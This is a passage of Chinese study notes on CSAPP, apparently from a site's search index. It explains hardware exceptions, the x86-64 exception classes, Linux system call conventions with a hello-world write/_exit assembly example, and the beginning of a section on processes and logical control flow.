<li>\u5176\u4ed6\u53f7\u7801\u662f\u7531\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\uff08\u64cd\u4f5c\u7cfb\u7edf\u5e38\u9a7b\u5185\u5b58\u7684\u90e8\u5206\uff09\u7684\u8bbe\u8ba1\u8005\u5206\u914d\uff1a\u4f8b\u5982\u5305\u62ec\u7cfb\u7edf\u8c03\u7528\u548c\u6765\u81ea\u5916\u90e8 I/O \u8bbe\u5907\u7684\u4fe1\u53f7\u3002</li> </ul> <p>\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\uff08\u5f53\u8ba1\u7b97\u673a\u91cd\u542f\u6216\u8005\u52a0\u7535\u65f6\uff09\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5206\u914d\u548c\u521d\u59cb\u5316\u4e00\u5f20\u79f0\u4e3a \u5f02\u5e38\u8868 \u7684\u8df3\u8f6c\u8868\uff0c\u4f7f\u5f97\u8868\u76ee k \u5305\u542b\u5f02\u5e38 k \u7684\u5904\u7406\u7a0b\u5e8f\u7684\u5730\u5740\uff0c\u4e0b\u56fe\u5c55\u793a\u4e86\u5f02\u5e38\u8868\u7684\u683c\u5f0f\uff1a</p> <p></p> <p>\u5728\u8fd0\u884c\u65f6\uff08\u5f53\u7cfb\u7edf\u5728\u6267\u884c\u67d0\u4e2a\u7a0b\u5e8f\u65f6\uff09\uff0c\u5904\u7406\u5668\u68c0\u6d4b\u5230\u53d1\u751f\u4e86\u4e00\u4e2a\u4e8b\u4ef6\uff0c\u5e76\u4e14\u786e\u5b9a\u4e86\u76f8\u5e94\u7684\u5f02\u5e38\u53f7 k\u3002\u968f\u540e\uff0c\u5904\u7406\u5668\u89e6\u53d1\u5f02\u5e38\uff0c\u65b9\u6cd5\u662f\u6267\u884c\u95f4\u63a5\u8fc7\u7a0b\u8c03\u7528\uff0c\u901a\u8fc7\u5f02\u5e38\u8868\u7684\u8868\u76ee k\uff0c\u8f6c\u5230\u76f8\u5e94\u7684\u5904\u7406\u7a0b\u5e8f\u3002\u4e0b\u56fe\u5c55\u793a\u4e86\u5904\u7406\u5668\u5982\u4f55\u4f7f\u7528\u5f02\u5e38\u8868\u6765\u5f62\u6210\u9002\u5f53\u7684\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u7684\u5730\u5740\u3002\u5f02\u5e38\u53f7\u662f\u5230\u5f02\u5e38\u8868\u4e2d\u7684\u7d22\u5f15\uff0c\u5f02\u5e38\u8868\u7684\u8d77\u59cb\u5730\u5740\u653e\u5728\u4e00\u4e2a\u53eb\u505a \u5f02\u5e38\u8868\u57fa\u5740\u5bc4\u5b58\u5668\uff08exception table base register\uff09\u7684\u7279\u6b8a CPU \u5bc4\u5b58\u5668\u91cc\u3002</p> <p></p> <p>\u5f02\u5e38\u5c31\u7c7b\u4f3c\u4e8e\u8fc7\u7a0b\u8c03\u7528\uff08e.g. \u51fd\u6570\u8c03\u7528\uff09\uff0c\u4f46\u4e5f\u6709\u4e0d\u540c\u4e4b\u5904\uff0c\u4f8b\u5982\u5982\u679c\u63a7\u5236\u4ece\u7528\u6237\u7a0b\u5e8f\u8f6c\u79fb\u5230\u5185\u6838\uff0c\u6240\u6709\u8fd9\u4e9b\u9879\u76ee\u90fd\u88ab\u538b\u5230\u5185\u6838\u6808\u4e2d\uff0c\u800c\u4e0d\u662f\u538b\u5230\u7528\u6237\u6808\u4e2d\uff0c\u6b64\u5916\u7531\u4e8e\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u8fd0\u884c\u5728\u5185\u6838\u6a21\u5f0f\u4e0b\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u4eec\u5bf9\u6240\u6709\u7684\u7cfb\u7edf\u8d44\u6e90\u90fd\u6709\u5b8c\u5168\u7684\u8bbf\u95ee\u6743\u9650\u3002\u6b64\u5916\uff0c\u538b\u5165\u6808\u7684\u5185\u5bb9\u548c\u8fd4\u56de\u5730\u5740\u4e5f\u6709\u6240\u4e0d\u540c\u3002</p> <p>\u5f02\u5e38\u7684\u7c7b\u522b</p> <p>\u5f02\u5e38\u53ef\u4ee5\u5206\u4e3a\u56db\u7c7b\uff1a\u4e2d\u65ad\uff08interrupt\uff09\uff0c\u9677\u9631\uff08trap\uff09\u3001\u6545\u969c\uff08fault\uff09\u548c \u7ec8\u6b62\uff08abort\uff09\u3002\u4e0b\u8868\u5bf9\u8fd9\u4e9b\u7c7b\u522b\u7684\u5c5e\u6027\u505a\u4e86\u5c0f\u7ed3\u3002</p> \u7c7b\u522b \u539f\u56e0 \u5f02\u6b65/\u540c\u6b65 \u8fd4\u56de\u884c\u4e3a \u4e2d\u65ad \u6765\u81ea I/O \u8bbe\u5907\u7684\u4fe1\u53f7 \u5f02\u6b65 \u603b\u662f\u8fd4\u56de\u5230\u4e0b\u4e00\u6761\u6307\u4ee4 \u9677\u9631\uff08\u7cfb\u7edf\u8c03\u7528\uff09 \u6709\u610f\u7684\u5f02\u5e38 \u540c\u6b65 \u603b\u662f\u8fd4\u56de\u5230\u4e0b\u4e00\u6761\u6307\u4ee4 \u6545\u969c \u6f5c\u5728\u53ef\u6062\u590d\u7684\u9519\u8bef \u540c\u6b65 \u53ef\u80fd\u8fd4\u56de\u5230\u5f53\u524d\u6307\u4ee4 \u7ec8\u6b62 \u4e0d\u53ef\u6062\u590d\u7684\u9519\u8bef \u540c\u6b65 \u4e0d\u4f1a\u8fd4\u56de <p>\u5bf9\u6bcf\u7c7b\u5f02\u5e38\u7684\u8be6\u7ec6\u4ecb\u7ecd\u53c2\u8003 CSAPP 504</p> <p>\u6ce8\u610f\u5230\u4e2d\u65ad\u662f\u5f02\u6b65\u53d1\u751f\u7684\uff0c\u901a\u5e38\u662f\u4f8b\u5982\u7f51\u7edc\u9002\u914d\u5668\u3001\u5b9a\u65f6\u5668\u82af\u7247\u7b49\u786c\u4ef6\u901a\u8fc7\u50cf\u5904\u7406\u5668\u82af\u7247\u4e0a\u7684\u4e00\u4e2a\u5f15\u811a\u53d1\u4fe1\u53f7\uff0c\u5e76\u5c06\u5f02\u5e38\u53f7\u653e\u5230\u7cfb\u7edf\u603b\u7ebf\u4e0a\u6765\u89e6\u53d1\u4e2d\u65ad\u3002</p> <p>\u5904\u7406\u4e2d\u65ad\u7684\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u88ab\u79f0\u4f5c \u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u3002</p> <p>\u63a5\u7740\u4ecb\u7ecd\u4e00\u4e0b\u9677\u9631\uff0c\u9677\u9631\u662f\u6709\u610f\u7684\u5f02\u5e38\uff0c\u662f\u6267\u884c\u4e00\u6761\u6307\u4ee4\u7684\u7ed3\u679c\u3002\u5c31\u50cf\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u4e00\u6837\uff0c\u9677\u9631\u5904\u7406\u7a0b\u5e8f\u5c06\u63a7\u5236\u8fd4\u56de\u5230\u4e0b\u4e00\u6761\u6307\u4ee4\u3002</p> <p>\u9677\u9631\u6700\u91cd\u8981\u7684\u7528\u9014\u662f\u5728\u7528\u6237\u7a0b\u5e8f\u548c\u5185\u6838\u4e4b\u95f4\u63d0\u4f9b\u4e00\u4e2a\u50cf\u8fc7\u7a0b\u8c03\u7528\u4e00\u6837\u7684\u63a5\u53e3\uff0c\u53eb\u505a\u7cfb\u7edf\u8c03\u7528\u3002</p> <p>\u7528\u6237\u7a0b\u5e8f\u7ecf\u5e38\u9700\u8981\u5411\u5185\u6838\u8bf7\u6c42\u670d\u52a1\uff0c\u6bd4\u5982\u8bfb\u4e00\u4e2a\u6587\u4ef6\uff08read\uff09\u3001\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u8fdb\u7a0b\uff08fork\uff09\uff0c\u52a0\u8f7d\u4e00\u4e2a\u65b0\u7684\u7a0b\u5e8f\uff08execve\uff09\uff0c\u6216\u8005\u7ec8\u6b62\u5f53\u524d\u8fdb\u7a0b\uff08exit\uff09\u3002\u4e3a\u4e86\u5141\u8bb8\u5bf9\u8fd9\u4e9b\u5185\u6838\u670d\u52a1\u7684\u53d7\u63a7\u7684\u8bbf\u95ee\uff0c\u5904\u7406\u5668\u63d0\u4f9b\u4e86\u4e00\u6761\u7279\u6b8a\u7684 \u201csyscall n\u201d \u6307\u4ee4\uff0c\u5f53\u7528\u6237\u7a0b\u5e8f\u60f3\u8981\u8bf7\u6c42\u670d\u52a1 n \u65f6\uff0c\u53ef\u4ee5\u6267\u884c\u8fd9\u6761\u6307\u4ee4\u3002 \u6267\u884c syscall \u6307\u4ee4\u4f1a\u5bfc\u81f4\u4e00\u4e2a\u5230\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u7684\u9677\u9631\uff0c\u8fd9\u4e2a\u5904\u7406\u7a0b\u5e8f\u89e3\u6790\u53c2\u6570\uff0c\u5e76\u8c03\u7528\u9002\u5f53\u7684\u5185\u6838\u7a0b\u5e8f\u3002</p> <p>\u5982\u56fe\u6982\u8ff0\u4e86\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528\u7684\u5904\u7406\uff1a</p> <p></p> <p>\u4ece\u7a0b\u5e8f\u5458\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u7cfb\u7edf\u8c03\u7528\u548c\u666e\u901a\u7684\u51fd\u6570\u8c03\u7528\u662f\u4e00\u6837\u7684\u3002\u7136\u800c\uff0c\u5b83\u4eec\u7684\u5b9e\u73b0\u975e\u5e38\u4e0d\u540c\u3002\u666e\u901a\u7684\u51fd\u6570\u8fd0\u884c\u5728\u7528\u6237\u6a21\u5f0f\u4e2d\uff0c\u7528\u6237\u6a21\u5f0f\u9650\u5236\u4e86\u51fd\u6570\u53ef\u4ee5\u6267\u884c\u7684\u6307\u4ee4\u7684\u7c7b\u578b\uff0c\u800c\u4e14\u5b83\u4eec\u53ea\u80fd\u8bbf\u95ee\u4e0e\u8c03\u7528\u51fd\u6570\u76f8\u540c\u7684\u6808\u3002\u7cfb\u7edf\u8c03\u7528\u8fd0\u884c\u5728\u5185\u6838\u6a21\u5f0f\u4e2d\uff0c\u5185\u6838\u6a21\u5f0f\u5141\u8bb8\u7cfb\u7edf\u8c03\u7528\u6267\u884c\u7279\u6743\u6307\u4ee4\uff0c\u5e76\u8bbf\u95ee\u5b9a\u4e49\u5728\u5185\u6838\u4e2d\u7684\u6808\u3002</p> <p>Linux/x86-64 \u7cfb\u7edf\u4e2d\u7684\u5f02\u5e38</p> <p>\u4e3a\u4e86\u4f7f\u63cf\u8ff0\u66f4\u5177\u4f53\uff0c\u8ba9\u6211\u4eec\u6765\u770b\u770b\u4e3a x86-64 \u7cfb\u7edf\u5b9a\u4e49\u7684\u4e00\u4e9b\u5f02\u5e38\u3002\u6709\u9ad8\u8fbe 256 \u79cd\u4e0d\u540c\u7684\u5f02\u5e38\u7c7b\u578b\uff1a</p> <ul> <li>0 \u223c 31 \u7684\u53f7\u7801\u5bf9\u5e94\u7684\u662f\u7531 Intel \u67b6\u6784\u5e08\u5b9a\u4e49\u7684\u5f02\u5e38\uff0c\u56e0\u6b64\u5bf9\u4efb\u4f55 x86-64 \u7cfb\u7edf\u90fd\u662f\u4e00\u6837\u7684</li> <li>32 \u223c 255 \u7684\u53f7\u7801\u5bf9\u5e94\u7684\u662f\u64cd\u4f5c\u7cfb\u7edf\u5b9a\u4e49\u7684\u4e2d\u65ad\u548c\u9677\u9631\u3002</li> </ul> \u5f02\u5e38\u53f7 \u63cf\u8ff0 \u5f02\u5e38\u7c7b\u522b 0 \u9664\u6cd5\u9519\u8bef \u6545\u969c 13 \u4e00\u822c\u4fdd\u62a4\u6545\u969c \u6545\u969c 14 \u7f3a\u9875 \u6545\u969c 18 \u673a\u5668\u68c0\u67e5 \u7ec8\u6b62 32 ~ 255 \u64cd\u4f5c\u7cfb\u7edf\u5b9a\u4e49\u7684\u5f02\u5e38 \u4e2d\u65ad\u6216\u9677\u9631 <p>\u2460 \u6545\u969c\u548c\u7ec8\u6b62</p> <ul> <li> <p>\u9664\u6cd5\u9519\u8bef\u3002 \u5f53\u5e94\u7528\u8bd5\u56fe\u9664\u4ee5\u96f6\u65f6\uff0c\u6216\u8005\u5f53\u4e00\u4e2a\u9664\u6cd5\u6307\u4ee4\u7684\u7ed3\u679c\u5bf9\u4e8e\u76ee\u6807\u64cd\u4f5c\u6570\u6765\u8bf4\u592a\u5927\u4e86\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u53d1\u751f\u9664\u6cd5\u9519\u8bef\uff08\u5f02\u5e38 0\uff09\u3002Unix   \u4e0d\u4f1a\u8bd5\u56fe\u4ece\u9664\u6cd5\u9519\u8bef\u4e2d\u6062\u590d\uff0c\u800c\u662f\u9009\u62e9\u7ec8\u6b62\u7a0b\u5e8f\u3002Linuxshell \u901a\u5e38\u4f1a\u628a\u9664\u6cd5\u9519\u8bef\u62a5\u544a\u4e3a\u201c\u6d6e\u70b9\u5f02\u5e38\uff08Floating exception\uff09\u201d\u3002</p> </li> <li> <p>\u4e00\u822c\u4fdd\u62a4\u6545\u969c\u3002 \u8bb8\u591a\u539f\u56e0\u90fd\u4f1a\u5bfc\u81f4\u4e0d\u4e3a\u4eba\u77e5\u7684\u4e00\u822c\u4fdd\u62a4\u6545\u969c\uff08\u5f02\u5e38 13\uff09\uff0c\u901a\u5e38\u662f\u56e0\u4e3a\u4e00\u4e2a\u7a0b\u5e8f\u5f15\u7528\u4e86\u4e00\u4e2a\u672a\u5b9a\u4e49\u7684\u865a\u62df\u5185\u5b58\u533a\u57df\uff0c\u6216\u8005\u56e0\u4e3a\u7a0b\u5e8f\u8bd5\u56fe\u5199\u4e00\u4e2a\u53ea\u8bfb\u7684\u6587\u672c\u6bb5\u3002Linux   \u4e0d\u4f1a\u5c1d\u8bd5\u6062\u590d\u8fd9\u7c7b\u6545\u969c\u3002Linux shell \u901a\u5e38\u4f1a\u628a\u8fd9\u79cd\u4e00\u822c\u4fdd\u62a4\u6545\u969c\u62a5\u544a\u4e3a\u201c\u6bb5\u6545\u969c\uff08Segmentation fault\uff09\u201d\u3002</p> </li> <li> <p>\u7f3a\u9875\uff08\u5f02\u5e38 14\uff09\u662f\u4f1a\u91cd\u65b0\u6267\u884c\u4ea7\u751f\u6545\u969c\u7684\u6307\u4ee4\u7684\u4e00\u4e2a\u5f02\u5e38\u793a\u4f8b\u3002\u5904\u7406\u7a0b\u5e8f\u5c06\u9002\u5f53\u7684\u78c1\u76d8\u4e0a\u865a\u62df\u5185\u5b58\u7684\u4e00\u4e2a\u9875\u9762\u6620\u5c04\u5230\u7269\u7406\u5185\u5b58\u7684\u4e00\u4e2a\u9875-   \u9762\uff0c\u7136\u540e\u91cd\u65b0\u6267\u884c\u8fd9\u6761\u4ea7\u751f\u6545\u969c\u7684\u6307\u4ee4\u3002\u6211\u4eec\u5c06\u5728\u7b2c 9 \u7ae0\u4e2d\u770b\u5230\u7f3a\u9875\u662f\u5982\u4f55\u5de5\u4f5c\u7684\u7ec6\u8282\u3002</p> </li> <li> <p>\u673a\u5668\u68c0\u67e5\u3002 \u673a\u5668\u68c0\u67e5\uff08\u5f02\u5e38 18\uff09\u662f\u5728\u5bfc\u81f4\u6545\u969c\u7684\u6307\u4ee4\u6267\u884c\u4e2d\u68c0\u6d4b\u5230\u81f4\u547d\u7684\u786c\u4ef6\u9519\u8bef\u65f6\u53d1\u751f\u7684\u3002\u673a\u5668\u68c0\u67e5\u5904\u7406\u7a0b\u5e8f\u4ece\u4e0d\u8fd4\u56de\u63a7\u5236\u7ed9\u5e94\u7528\u7a0b\u5e8f\u3002</p> </li> </ul> <p>\u2461 \u7cfb\u7edf\u8c03\u7528</p> <p>Linux \u63d0\u4f9b\u51e0\u767e\u79cd\u7cfb\u7edf\u8c03\u7528\uff0c\u5f53\u5e94\u7528\u7a0b\u5e8f\u60f3\u8981\u8bf7\u6c42\u5185\u6838\u670d\u52a1\u65f6\u53ef\u4ee5\u4f7f\u7528\uff0c\u5305\u62ec\u8bfb\u6587\u4ef6\u3001\u5199\u6587\u4ef6\u6216\u662f\u521b\u5efa\u4e00\u4e2a\u65b0\u8fdb\u7a0b\u3002\u4e0b\u8868\u7ed9\u51fa\u4e86\u4e00\u4e9b\u5e38\u89c1\u7684 Linux \u7cfb\u7edf\u8c03\u7528\u3002\u6bcf\u4e2a\u7cfb\u7edf\u8c03\u7528\u90fd\u6709\u4e00\u4e2a\u552f\u4e00\u7684\u6574\u6570\u53f7\uff0c\u5bf9\u5e94\u4e8e\u4e00\u4e2a\u5230\u5185\u6838\u4e2d\u8df3\u8f6c\u8868\u7684\u504f\u79fb\u91cf\u3002\uff08\u6ce8\u610f\uff1a\u8fd9\u4e2a\u8df3\u8f6c\u8868\u548c\u5f02\u5e38\u8868\u4e0d\u4e00\u6837\u3002\uff09</p> \u7f16\u53f7 \u540d\u5b57 \u63cf\u8ff0 \u7f16\u53f7 \u540d\u5b57 \u63cf\u8ff0 0 read \u8bfb\u6587\u4ef6 33 pause \u6302\u8d77\u8fdb\u7a0b\u76f4\u5230\u4fe1\u53f7\u5230\u8fbe 1 write \u5199\u6587\u4ef6 37 alarm \u8c03\u5ea6\u544a\u8b66\u4fe1\u53f7\u7684\u4f20\u9001 2 open \u6253\u5f00\u6587\u4ef6 39 getpid \u83b7\u5f97\u8fdb\u7a0b ID 3 close \u5173\u95ed\u6587\u4ef6 57 fork \u521b\u5efa\u8fdb\u7a0b 4 stat \u83b7\u5f97\u6587\u4ef6\u4fe1\u606f 59 execve \u6267\u884c\u4e00\u4e2a\u7a0b\u5e8f 9 mmap \u5c06\u5185\u5b58\u9875\u6620\u5c04\u5230\u6587\u4ef6 60 _exit \u7ec8\u6b62\u8fdb\u7a0b 12 brk \u91cd\u7f6e\u5806\u9876 61 wait4 \u7b49\u5f85\u4e00\u4e2a\u8fdb\u7a0b\u7ec8\u6b62 32 dup2 \u590d\u5236\u6587\u4ef6\u63cf\u8ff0\u7b26 62 kill \u53d1\u9001\u4fe1\u53f7\u5230\u4e00\u4e2a\u8fdb\u7a0b <p>C \u7a0b\u5e8f\u7528 syscall \u51fd\u6570\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528\u4efb\u4f55\u7cfb\u7edf\u8c03\u7528\u3002\u7136\u800c\uff0c\u5b9e\u9645\u4e2d\u51e0\u4e4e\u6ca1\u5fc5\u8981\u8fd9\u4e48\u505a\u3002\u5bf9\u4e8e\u5927\u591a\u6570\u7cfb\u7edf\u8c03\u7528\uff0c\u6807\u51c6 C \u5e93\u63d0\u4f9b\u4e86\u4e00\u7ec4\u65b9\u4fbf\u7684\u5305\u88c5\u51fd\u6570\u3002 \u8fd9\u4e9b\u5305\u88c5\u51fd\u6570\u5c06\u53c2\u6570\u6253\u5305\u5230\u4e00\u8d77\uff0c\u4ee5\u9002\u5f53\u7684\u7cfb\u7edf\u8c03\u7528\u6307\u4ee4\u9677\u5165\u5185\u6838\uff0c\u7136\u540e\u5c06\u7cfb\u7edf\u8c03\u7528\u7684\u8fd4\u56de\u72b6\u6001\u4f20\u9012\u56de\u8c03\u7528\u7a0b\u5e8f\u3002</p> <p>\u5728\u672c\u7b14\u8bb0\u4e2d\uff0c\u6211\u4eec\u5c06\u7cfb\u7edf\u8c03\u7528\u548c\u4e0e\u5b83\u4eec\u76f8\u5173\u8054\u7684\u5305\u88c5\u51fd\u6570\u90fd\u79f0\u4e3a \u7cfb\u7edf\u7ea7\u51fd\u6570\uff0c\u8fd9\u4e24\u4e2a\u672f\u8bed\u53ef\u4ee5\u4e92\u6362\u5730\u4f7f\u7528\u3002</p> <p>\u5728 X86-64 \u7cfb\u7edf\u4e0a\uff0c\u7cfb\u7edf\u8c03\u7528\u662f\u901a\u8fc7\u4e00\u6761\u79f0\u4e3a syscall \u7684\u9677\u9631\u6307\u4ee4\u6765\u63d0\u4f9b\u7684\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5982\u4f55\u4f7f\u7528 syscall \u6307\u4ee4\u6765\u76f4\u63a5\u8c03\u7528 Linux \u7cfb\u7edf\u8c03\u7528\u5462\uff1f</p> <p>\u6240\u6709\u7684 Linux \u7cfb\u7edf\u8c03\u7528\u7684\u53c2\u6570\u90fd\u662f\u901a\u8fc7\u901a\u7528\u5bc4\u5b58\u5668\u800c\u4e0d\u662f\u6808\u4f20\u9012\u7684\uff0c\u6309\u7167\u60ef\u4f8b\uff1a</p> <ul> <li> <p>\u5bc4\u5b58\u5668 \uff05rax \u5305\u542b\u7cfb\u7edf\u8c03\u7528\u53f7</p> </li> <li> <p>\u5bc4\u5b58\u5668 %rdi\u3001%rsi\u3001%rdx\u3001%r10\u3001%r8 \u548c \uff05r9 \u5305\u542b\u6700\u591a 6 \u4e2a\u53c2\u6570\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u5728 \uff05rdi \u4e2d\uff0c\u7b2c\u4e8c\u4e2a\u5728 \uff05rsi \u4e2d\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002</p> </li> <li> <p>\u4ece\u7cfb\u7edf\u8c03\u7528\u8fd4\u56de\u65f6\uff0c\u5bc4\u5b58\u5668 %rcx \u548c \uff05r11 \u90fd\u4f1a\u88ab\u7834\u574f\uff0c\uff05rax \u5305\u542b\u8fd4\u56de\u503c\u3002</p> </li> </ul> <p>-4095 \u5230 -1 \u4e4b\u95f4\u7684\u8d1f\u6570\u8fd4\u56de\u503c\u8868\u660e\u53d1\u751f\u4e86\u9519\u8bef\uff0c\u5bf9\u5e94\u4e8e\u8d1f\u7684 errno\u3002</p> <p>\u4f8b\u5982\uff0c\u8003\u8651\u5927\u5bb6\u719f\u6089\u7684 hello \u7a0b\u5e8f\u7684\u4e0b\u9762\u8fd9\u4e2a\u7248\u672c\uff0c\u7528\u7cfb\u7edf\u7ea7\u51fd\u6570 write \u6765\u5199\uff0c\u800c\u4e0d\u662f\u7528 printf\uff1a</p> <pre><code>int main()\n{\n    // \u7b2c\u4e00\u4e2a\u53c2\u6570\u5c06\u8f93\u51fa\u53d1\u9001\u5230 stdout\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u8981\u5199\u7684\u5b57\u8282\u5e8f\u5217\u3002\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u8981\u5199\u7684\u5b57\u8282\u6570\n    write(1, \"hello, world\\n\", 13);\n    _exit(0);\n}\n</code></pre> <p>\u5176\u6c47\u7f16\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>1 .section .data\n2 string:\n3   .ascii \"hello, world\\n\"\n4 string_end:\n5   .equ len, string_end - string\n6 .section .text\n7 .globl main\n8 main:\n    ## First, call write(1, \"hello, world\\n\", 13)\n9   movq $1, %rax                 ## write is system call 1\n10  movq $1, %rdi                 ## Arg1: stdout has descriptor 1\n11  movq $string, %rsi            ## Arg2: hello world string\n12  movq $len, %rdx               ## Arg3: string length\n13  syscall                       ## Make the system call\n\n    ## Next, call _exit(0)\n14  movq $60, %rax                ## _exit is system call 60\n15  movq $0, %rdi                 ## Arg1: exit status is 0\n16  syscall                       ## Make the system call\n</code></pre> <p>\u76f4\u63a5\u4f7f\u7528 syscall \u6307\u4ee4\u6765\u8c03\u7528 write \u548c exit \u7cfb\u7edf\u8c03\u7528:</p> <ul> <li>\u7b2c 9 \u223c 13 \u884c\u8c03\u7528 write \u51fd\u6570\u3002\u9996\u5148\uff0c\u7b2c 9 \u884c\u5c06\u7cfb\u7edf\u8c03\u7528 write \u7684\u7f16\u53f7\u5b58\u653e\u5728 \uff05rax \u4e2d\uff0c\u7b2c 10 \u223c 12 \u884c\u8bbe\u7f6e\u53c2\u6570\u5217\u8868\u3002\u7136\u540e\u7b2c 13 \u884c\u4f7f\u7528   syscall \u6307\u4ee4\u6765\u8c03\u7528\u7cfb\u7edf\u8c03\u7528\u3002</li> <li>\u7c7b\u4f3c\u5730\uff0c\u7b2c 14 \u223c 16 \u884c\u8c03\u7528 _exit \u7cfb\u7edf\u8c03\u7528\u3002</li> </ul>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_18","title":"\u64cd\u4f5c\u7cfb\u7edf\u5c42\uff1a\u8fdb\u7a0b","text":"<p>\u8fdb\u7a0b\u7684\u7ecf\u5178\u5b9a\u4e49\u5c31\u662f\u4e00\u4e2a\u6267\u884c\u4e2d\u7a0b\u5e8f\u7684\u5b9e\u4f8b\u3002\u6bcf\u6b21\u7528\u6237\u901a\u8fc7\u5411 shell \u8f93\u5165\u4e00\u4e2a\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u7684\u540d\u5b57\uff0c\u8fd0\u884c\u7a0b\u5e8f\u65f6\uff0cshell \u5c31\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u8fdb\u7a0b\uff0c\u7136\u540e\u5728\u8fd9\u4e2a\u65b0\u8fdb\u7a0b\u7684\u4e0a\u4e0b\u6587\u4e2d\u8fd0\u884c\u8fd9\u4e2a\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u3002\u5e94\u7528\u7a0b\u5e8f\u4e5f\u80fd\u591f\u521b\u5efa\u65b0\u8fdb\u7a0b\uff0c\u5e76\u4e14\u5728\u8fd9\u4e2a\u65b0\u8fdb\u7a0b\u7684\u4e0a\u4e0b\u6587\u4e2d\u8fd0\u884c\u5b83\u4eec\u81ea\u5df1\u7684\u4ee3\u7801\u6216\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u3002</p> <p>\u672c\u7b14\u8bb0\u4e0d\u8ba8\u8bba\u64cd\u4f5c\u7cfb\u7edf\u5982\u4f55\u5b9e\u73b0\u8fdb\u7a0b\u7684\u7ec6\u8282\uff0c\u800c\u662f\u5c06\u5173\u6ce8\u8fdb\u7a0b\u63d0\u4f9b\u7ed9\u5e94\u7528\u7a0b\u5e8f\u7684\u5173\u952e\u62bd\u8c61\uff1a</p> <ul> <li>\u4e00\u4e2a\u72ec\u7acb\u7684 \u903b\u8f91\u63a7\u5236\u6d41\uff0c\u5b83\u63d0\u4f9b\u4e00\u4e2a\u5047\u8c61\uff0c\u597d\u50cf\u6211\u4eec\u7684\u7a0b\u5e8f\u72ec\u5360\u5730\u4f7f\u7528\u5904\u7406\u5668\u3002</li> <li>\u4e00\u4e2a\u79c1\u6709\u7684\u5730\u5740\u7a7a\u95f4\uff0c\u5b83\u63d0\u4f9b\u4e00\u4e2a\u5047\u8c61\uff0c\u597d\u50cf\u6211\u4eec\u7684\u7a0b\u5e8f\u72ec\u5360\u5730\u4f7f\u7528\u5185\u5b58\u7cfb\u7edf\u3002\u8ba9\u6211\u4eec\u66f4\u6df1\u5165\u5730\u770b\u770b\u8fd9\u4e9b\u62bd\u8c61\u3002</li> </ul> <p>\u9996\u5148\u4f1a\u4ecb\u7ecd\u4ec0\u4e48\u662f\u903b\u8f91\u63a7\u5236\u6d41\u3001\u5e76\u53d1\u6d41\u4ee5\u53ca\u79c1\u6709\u5730\u5740\u7a7a\u95f4\uff0c\u63a5\u7740\u4ecb\u7ecd\u7528\u6237\u6a21\u5f0f\u548c\u5185\u6838\u6a21\u5f0f\uff0c\u7136\u540e\u4ecb\u7ecd\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u6700\u540e\u5728\u6b64\u57fa\u7840\u4e4b\u4e0a\u7ed3\u5408 Linux \u7cfb\u7edf\u5bf9\u5176\u63d0\u4f9b\u7684\u7cfb\u7edf\u51fd\u6570\u8fdb\u884c\u8bb2\u89e3\u3002</p> <p>\u4e00\u3001\u903b\u8f91\u63a7\u5236\u6d41</p> <p>\u5982\u679c\u7528\u8c03\u8bd5\u5668\u5355\u6b65\u6267\u884c\u7a0b\u5e8f\uff0c\u6211\u4eec\u4f1a\u770b\u5230\u4e00\u7cfb\u5217\u7684\u7a0b\u5e8f\u8ba1\u6570\u5668 PC \u7684\u503c\uff0c\u8fd9\u4e9b\u503c\u552f\u4e00\u5730\u5bf9\u5e94\u4e8e\u5305\u542b\u5728\u7a0b\u5e8f\u7684\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u6307\u4ee4\uff08\u7684\u5730\u5740\uff09\uff0c\u6216\u662f\u5305\u542b\u5728\u8fd0\u884c\u65f6\u52a8\u6001\u94fe\u63a5\u5230\u7a0b\u5e8f\u7684\u5171\u4eab\u5bf9\u8c61\u4e2d\u7684\u6307\u4ee4\uff08\u7684\u5730\u5740\uff09\u3002</p> <p>\u5c06 PC \u503c\u7684\u5e8f\u5217\u53eb\u505a \u903b\u8f91\u63a7\u5236\u6d41\uff0c\u6216\u8005\u7b80\u79f0 \u903b\u8f91\u6d41\u3002</p> <p></p> <p>\u5982\u56fe\u4e3a\u8fd0\u884c\u7740\u4e09\u4e2a\u8fdb\u7a0b\u7684\u7cfb\u7edf\uff0c\u5904\u7406\u5668\u7684\u4e00\u4e2a\u7269\u7406\u63a7\u5236\u6d41\u88ab\u5206\u6210\u4e86\u4e09\u4e2a\u903b\u8f91\u6d41\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u4e00\u4e2a\u3002</p> <p>\u8fdb\u7a0b A \u8fd0\u884c\u4e86\u4e00\u4f1a\uff0c\u7136\u540e\u662f\u8fdb\u7a0b B \u5f00\u59cb\u8fd0\u884c\u5230\u5b8c\u6210\u3002\u7136\u540e\uff0c\u8fdb\u7a0b C \u8fd0\u884c\u4e86\u4e00\u4f1a\u513f\uff0c\u8fdb\u7a0b A 